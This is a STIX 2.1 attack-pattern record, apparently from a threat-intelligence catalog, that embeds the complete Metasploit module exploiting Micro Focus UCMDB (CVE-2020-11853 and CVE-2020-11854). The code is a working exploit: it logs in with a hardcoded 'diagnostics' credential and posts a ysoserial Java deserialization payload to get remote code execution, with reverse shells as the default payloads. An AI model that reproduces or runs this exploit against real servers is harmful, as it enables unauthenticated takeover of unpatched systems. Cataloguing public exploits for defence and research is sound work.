{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--07895d67-7e0a-4819-8c27-82136557c46b",
    "created": "2024-08-14T17:10:19.995343Z",
    "modified": "2024-08-14T17:10:19.995347Z",
    "name": "Micro Focus UCMDB Java Deserialization Unauthenticated Remote Code Execution",
    "description": " This module exploits two vulnerabilities, that when chained allow an attacker to achieve unauthenticated remote code execution in Micro Focus UCMDB. UCMDB included in versions 2020.05 and below of Operations Bridge Manager are affected but this module can probably also be used to exploit Operations Bridge Manager (containerized) and Application Performance Management. Check the advisory and module documentation for details. The first vulnerability is a hardcoded password for the \"diagnostics\" user, which allows us to login to UCMDB. The second vulnerability is a run-of-the-mill Java deserialization, which can be exploited with ysoserial's CommonsBeanutils1 payload. Both Windows and Linux installations are vulnerable.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/microfocus_ucmdb_unauth_deser.rb",
            "external_id": "microfocus_ucmdb_unauth_deser.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBM.md"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-11853"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-11854"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::JavaDeserialization\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Micro Focus UCMDB Java Deserialization Unauthenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits two vulnerabilities, that when chained allow an attacker\n          to achieve unauthenticated remote code execution in Micro Focus UCMDB.\n          UCMDB included in versions 2020.05 and below of Operations Bridge Manager are affected,\n          but this module can probably also be used to exploit Operations Bridge Manager\n          (containerized) and Application Performance Management.\n          Check the advisory and module documentation for details.\n          The first vulnerability is a hardcoded password for the \"diagnostics\" user, which\n          allows us to login to UCMDB. The second vulnerability is a run-of-the-mill Java\n          deserialization, which can be exploited with ysoserial's CommonsBeanutils1 payload.\n          Both Windows and Linux installations are vulnerable.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability discovery and Metasploit module\n        ],\n        'References' => [\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBM.md'],\n          [ 'CVE', '2020-11853'],\n          [ 'CVE', '2020-11854'],\n          [ 'ZDI', '20-1287'],\n          [ 'ZDI', '20-1288'],\n        ],\n        'Privileged' => true,\n        'Platform' => %w[unix win],\n        'DefaultOptions' => {\n          'WfsDelay' => 15\n        },\n        # unfortunately could not find a way to determine target automatically\n        'Targets' => [\n          [\n            'Windows',\n            {\n              'Platform' => 'win',\n              'DefaultOptions' =>\n              { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' }\n            },\n          ],\n          [\n            'Linux',\n            {\n              'Platform' => 'unix',\n              'Arch' => [ARCH_CMD],\n              'DefaultOptions' =>\n              { 'PAYLOAD' => 'cmd/unix/reverse_python' }\n            },\n          ]\n        ],\n        'DisclosureDate' => '2020-10-28',\n        'DefaultTarget' => 0\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(8443),\n        OptString.new('TARGETURI', [ true, 'Base UCMDB path', '/']),\n        OptBool.new('SSL', [true, 'Negotiate SSL/TLS', true]),\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'ucmdb-api', 'connect'),\n      'method' => 'GET'\n    })\n    if res && res.code == 200 && res.body.include?('HttpUcmdbServiceProviderFactoryImpl')\n      if res.body.include?('ServerVersion=11.6.0')\n        # 100% sure this version is vulnerable\n        return Exploit::CheckCode::Appears\n      end\n\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    print_status(\"#{peer} - Attacking #{target.name} target\")\n\n    # First, let's authenticate\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'ucmdb-ui', 'cms', 'loginRequest.do;'),\n      'method' => 'POST',\n      'vars_post' => {\n        'customerID' => '1',\n        'isEncoded' => 'false',\n        'userName' => 'diagnostics',\n        'password' => 'YWRtaW4=',\n        'ldapServerName' => 'UCMDB'\n      }\n    })\n    unless res && res.code == 200 && res.get_cookies.include?('LWSSO_COOKIE_KEY')\n      fail_with(Failure::NoAccess, \"#{peer} - Failed to authenticate with the diagnostics user!\")\n    end\n    cookies = res.get_cookies\n    print_good(\"#{peer} - Succesfully authenticated and obtained our cookie!\")\n\n    # Now let's pick a random service since we have so many to choose from :D\n    vuln_service = [\n      'services/CmdbOperationExecuterService',\n      'services/CategoryFacadeForGui',\n      'services/CorrelationFacadeForGui',\n      'services/CorrelationRunnerFacade',\n      'services/PackageFacadeForGui',\n      'services/SchedulerFacadeForGui',\n      'services/FoldersFacade',\n      'services/BusinessModelFacadeForGui',\n      'services/WatchServerAPI',\n      'services/TopologyService',\n      'services/ReportService',\n      'services/CMSImagesService',\n      'services/PatternService',\n      'services/FolderService',\n      'services/RelatedCIsService',\n      'services/MailService',\n      'services/DiscoveryService',\n      'services/ServiceDiscoveryService',\n      'services/SoftwareLibraryService',\n      'services/DataAcquisitionService',\n      'services/CIService',\n      'services/HistoryService',\n      'services/BundleService',\n      'services/LocationService',\n      'services/SchedulerService',\n      'services/ImpactService',\n      'services/CommonService',\n      'services/PermissionsService',\n      'services/ClassModelService',\n      'services/SnapshotService',\n      'services/LDAPService',\n      'services/CITService',\n      'services/MultiTenancyService',\n      'services/SecurityService',\n      'services/ResourceManagementService',\n      'services/AutomationMappingService',\n      'services/LicensingService',\n      'services/GenericAdapterService'\n    ].sample\n\n    # Simple as\n    java_payload = generate_java_deserialization_for_payload('CommonsBeanutils1', payload)\n\n    print_status(\"#{peer} - Sending payload to /#{vuln_service}\")\n\n    res = send_request_raw({\n      'uri' => normalize_uri(target_uri.path, 'ucmdb-ui', vuln_service),\n      'method' => 'POST',\n      'cookie' => cookies,\n      'headers' => { 'Content-Type' => 'application/x-java-serialized-object' },\n      'data' => java_payload\n    })\n\n    if res && res.code == 500\n      print_good(\"#{peer} - Success, shell incoming!\")\n      handler\n    else\n      print_error(\"#{peer} - Something failed, try again?\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-10-28",
    "x_mitre_platforms": [
        "unix'"
    ]
}